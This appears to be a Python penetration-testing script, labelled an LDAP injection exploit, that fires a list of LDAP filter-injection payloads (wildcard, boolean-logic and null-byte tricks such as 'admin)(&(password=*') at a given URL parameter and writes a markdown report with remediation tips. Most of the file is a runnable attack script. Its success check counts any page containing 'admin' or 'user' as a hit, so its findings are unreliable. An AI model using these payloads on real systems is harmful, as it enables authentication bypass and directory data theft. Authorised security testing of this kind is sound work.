#!/usr/bin/env python3
"""
LDAP Injection Exploit
Tests for LDAP injection vulnerabilities.
"""

import sys
import requests
from typing import List

class LDAPInjectionExploit:
    def __init__(self, url: str):
        self.url = url
        self.payloads = [
            '*',
            '*)(&',
            '*))%00',
            '*)(|(&',
            'admin)(&(password=*',
            '*)(uid=*))(|(uid=*',
            '*)(|(objectclass=*',
            '*)(|(mail=*',
            'admin)(&(1=1',
            '*)(|(cn=*'
        ]
        self.vulnerable = False
    
    def test_ldap_injection(self, param: str, value: str = 'test') -> bool:
        """Test for LDAP injection"""
        print(f"[*] Testing LDAP injection in parameter: {param}")
        
        for payload in self.payloads:
            try:
                test_value = value + payload
                response = requests.get(
                    self.url,
                    params={param: test_value},
                    timeout=10
                )
                
                # Check for successful authentication or data leakage
                if response.status_code == 200:
                    # Look for indicators of successful injection
                    if 'admin' in response.text.lower() or 'user' in response.text.lower():
                        print(f"[+] Potential LDAP injection found with: {payload}")
                        self.vulnerable = True
                        return True
            except:
                pass
        
        return False
    
    def generate_report(self) -> str:
        """Generate LDAP injection report"""
        report = f"# LDAP Injection Exploit Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: LDAP injection vulnerability detected!\n\n"
        else:
            report += "✅ No LDAP injection vulnerability detected.\n\n"
        
        report += "## Tested Payloads\n\n"
        for i, payload in enumerate(self.payloads, 1):
            report += f"{i}. `{payload}`\n"
        report += "\n"
        
        report += "## Common LDAP Injection Techniques\n\n"
        report += "1. **Wildcard Injection**: Using * to bypass filters\n"
        report += "2. **Boolean Logic**: Using &, |, ! operators\n"
        report += "3. **Null Byte**: Using %00 to terminate filters\n"
        report += "4. **Filter Manipulation**: Modifying LDAP filter syntax\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use parameterized LDAP queries\n"
        report += "2. Validate and sanitize input\n"
        report += "3. Use whitelist approach\n"
        report += "4. Escape special characters\n"
        report += "5. Implement proper access controls\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python ldap_injection.py <url> <parameter>")
        print("Example: python ldap_injection.py http://example.com/search username")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    exploit = LDAPInjectionExploit(url)
    exploit.test_ldap_injection(param)
    
    report = exploit.generate_report()
    
    filename = "ldap_injection_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] LDAP injection testing complete")
    print(f"[+] Report saved to {filename}")
    print("[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == "__main__":
    main()

